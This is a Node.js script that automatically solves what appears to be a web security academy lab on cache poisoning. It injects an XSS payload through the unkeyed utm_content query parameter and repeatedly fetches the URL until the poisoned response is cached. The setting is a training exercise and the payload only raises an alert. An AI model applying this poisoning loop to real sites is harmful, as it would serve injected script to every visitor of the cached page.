const { runLab, isSolved } = require('./_common.cjs');

const TITLE = 'Web cache poisoning via an unkeyed query parameter';
const PATH = '/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param';

async function waitSolved(page, labUrl, attempts = 10, delay = 5000) {
  for (let i = 0; i < attempts; i += 1) {
    if (await isSolved(page, labUrl)) return true;
    await page.waitForTimeout(delay);
  }
  return false;
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    page.on('dialog', (dialog) => dialog.accept().catch(() => {}));
    const payload = `' /><script>alert(1)</script>`;
    const cacheBuster = `cb=${Date.now()}`;
    const poisonUrl = `${labUrl}/?${cacheBuster}&utm_content=${encodeURIComponent(payload)}`;
    const verifyUrl = `${labUrl}/?${cacheBuster}`;

    for (let i = 0; i < 15; i += 1) {
      const response = await fetch(poisonUrl);
      const body = await response.text();
      if (body.includes('<script>alert(1)</script>')) break;
    }

    for (let i = 0; i < 12; i += 1) {
      const response = await fetch(verifyUrl);
      const body = await response.text();
      if (body.includes('<script>alert(1)</script>')) break;
    }

    for (let i = 0; i < 25; i += 1) {
      await fetch(`${labUrl}/?utm_content=${encodeURIComponent(payload)}`);
      if (await waitSolved(page, labUrl, 1, 4000)) return;
    }

    await waitSolved(page, labUrl, 8, 5000);
  },
});
